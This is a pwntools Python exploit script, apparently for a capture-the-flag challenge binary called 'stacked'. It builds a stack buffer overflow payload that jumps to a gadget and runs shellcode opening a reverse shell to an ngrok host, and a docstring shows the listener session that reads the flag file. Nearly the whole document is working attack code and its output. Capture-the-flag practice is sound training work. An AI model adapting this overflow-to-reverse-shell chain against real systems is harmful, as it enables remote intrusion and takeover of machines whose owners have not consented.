#!/usr/bin/python

from pwn import *

ELF_PATH = './stacked'

elf = ELF(ELF_PATH)
context.arch = 'amd64'

gdbscript = ''''''

"""
$ nc -vlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from localhost 57362 received!
id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
ls -l 
total 24
-r--r--r-- 1 root root    39 Dec 29 15:37 flag.txt
---x--x--x 1 root root 17720 Dec 29 15:37 stacked
cat flag.txt
flag{e4fd4c9fcad9ba84666e5c7a4a9ab1f0}
"""

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
def exploit(r):
    p = 'a'*0x408
    p += p64(elf.sym['useful'])
    p += asm(shellcraft.connect('4.tcp.ngrok.io', 15625))
    p += asm(shellcraft.dup2("rbp", 0))
    p += asm(shellcraft.dup2("rbp", 1))
    p += asm(shellcraft.dup2("rbp", 2))
    p += asm(shellcraft.sh())
    
    r.sendlineafter("> ", p)

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        # r = remote("localhost", 1234)
        r = remote("challenge.ctf.games", sys.argv[1])
    else:
        r = process(ELF_PATH, aslr=0)
    exploit(r)
